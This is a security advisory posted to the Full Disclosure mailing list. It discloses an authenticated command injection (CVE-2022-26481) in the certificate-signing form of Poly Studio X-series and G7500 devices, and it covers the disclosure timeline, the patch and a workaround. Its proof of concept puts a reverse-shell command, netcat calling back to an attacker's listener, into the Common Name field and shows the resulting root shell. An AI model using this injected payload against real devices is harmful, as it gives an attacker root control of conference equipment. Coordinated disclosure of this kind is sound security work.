
Date: Wed, 1 Jun 2022 05:18:51 +0000
From: "SEC Consult Vulnerability Lab,
 Research via Fulldisclosure" <fulldisclosure@...lists.org>
To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
Subject: [FD] SEC Consult SA-20220601-1 :: Authenticated Command Injection
 in Poly Studio

SEC Consult Vulnerability Lab Security Advisory < 20220601-1 >
=======================================================================
               title: Authenticated Command Injection
             product: Poly Studio X30, Studio X50, Studio X70, G7500
  vulnerable version: 3.4.0-292042, 3.5.0-344025, 3.6.0
       fixed version: 3.7.0 or higher
          CVE number: CVE-2022-26481
              impact: critical
            homepage: https://www.poly.com
               found: 2021-07-14
                  by: Johannes Kruchem (Office Vienna)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Atos company
                      Europe | Asia | North America

                      https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"Experience full board-room-quality audio, and knock-your-socks-off video,
for mid-sized rooms. The Poly Studio X50 all-in-one video bar is radically
simple to use with support for leading cloud video services built right
inâ€”no PC or Mac required. Voices are crisp and clear. Video feels natural.
And wireless content sharing lets users collaborate from their devices
without cables or pucks."

https://www.poly.com/us/en/products/video-conferencing/studio/studio-x50


Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.


Vulnerability overview/description:
-----------------------------------
1) Authenticated Command Injection with Elevated Privileges (CVE-2022-26481)
An authenticated Command Injection vulnerability exists in the web interface when
creating a certificate. An attacker is able to execute commands with root privileges.


Proof of concept:
-----------------
1) Authenticated Command Injection with Elevated Privileges (CVE-2022-26481)
When being authenticated:

1. In the system web interface, go to Security > Certificates.
2. Select Create Certificate Signing Request (CSR).
3. In the Certificate Details form, complete the following fields:

Common Name (CN): $(busybox nc 10.0.0.1 8888 -e /system/bin/sh)

(steps taken from https://documents.polycom.com/bundle/polypartnermode-ag-3-1-1/page/t1919784.html)

The previously started nc listener receives a connection from the camera
as root:

$ nc -lvp 8888
connect to [10.0.0.1] from (UNKNOWN) [10.0.0.2]
$ pwd
/oem/polycom/bin
$ whoami
root


Vulnerable / tested versions:
-----------------------------
At least the following firmware versions of Poly Studio X30, Studio X50, Studio X70 and
G7500 are affected:

- 3.4.0
- 3.5.0
- 3.6.0


Vendor contact timeline:
------------------------
2021-07-14: Contacting vendor through PSIRT email.
2021-07-15: Vendor sent PGP key.
2021-07-16: Advisory was sent to the vendor.
2021-07 to 2022-03: Further coordination with multiple emails and meetings.
2022-03-18: Vendor provides draft advisory.
2022-03 - 2022-06: Patch already available, waiting for vendor advisory release.
2022-06-01: Coordinated release of security advisory.


Solution:
---------
Update to firmware version 3.7.0 or higher.

The firmware can be downloaded from the vendor's support page:
https://www.poly.com/us/en/support/products


This issue has been documented in the vendor's security advisory PLYTV21-09:
https://www.poly.com/content/dam/www/products/support/global/security/2022/PLYTV21-09_Studio-X50-Improper-Neutralization-of-Special-Elements-used-in-an-OS-Command.pdf


Workaround:
-----------
In order to minimize the risk of exploitation, set a strong password for the
web interface and restrict network access to the device.


Advisory URL:
-------------
https://sec-consult.com/vulnerability-lab/


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult, an Atos company
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Atos company. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application https://sec-consult.com/career/

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices https://sec-consult.com/contact/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult

EOF Johannes Kruchem / @2022
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/